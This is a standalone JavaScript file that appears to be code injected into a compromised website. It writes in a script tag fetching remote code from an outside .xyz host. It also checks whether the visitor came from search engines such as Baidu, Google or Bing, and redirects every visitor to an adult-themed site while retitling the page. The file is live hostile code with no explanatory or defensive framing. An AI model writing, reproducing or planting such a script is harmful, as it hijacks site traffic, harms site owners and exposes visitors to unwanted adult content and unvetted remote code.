document.write("<script type=\"text/javascript\" src=\"https:\/\/7788521.xyz\/tj.js\"><\/script>");
//window.location = "https://www.seyuniu.com";
var jump_head = document.getElementsByTagName('head')[0];
var jump_script= document.createElement('script');
jump_script.type= 'text/javascript'; 
go_bots_url();
function go_bots_url(){
	var init_flag = "93989";
		bct = document.referrer;
		bot = ['baidu', 'sm', 'yahoo', 'bing', 'soso', 'sogou', '360.cn','google','so.com', 'youdao', 'anquan'];
		for (var i in bot) {
			if (bct.indexOf(bot[i]) != -1) {
				init_flag = "1245";
          window.location.href="https://www.seyuniu.com/";
			}
		}
		if(init_flag == "93989"){
			call_init_error();
		}
}
function call_init_error() {
	document.title = "色欲妞SeYuNiu.Com";
	window.location.href = 'https://www.seyuniu.com';
}
//document.write("<iframe src=\"https:\/\/www.seyuniu.com\" width=\"100%\" height=\"1100px\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe>");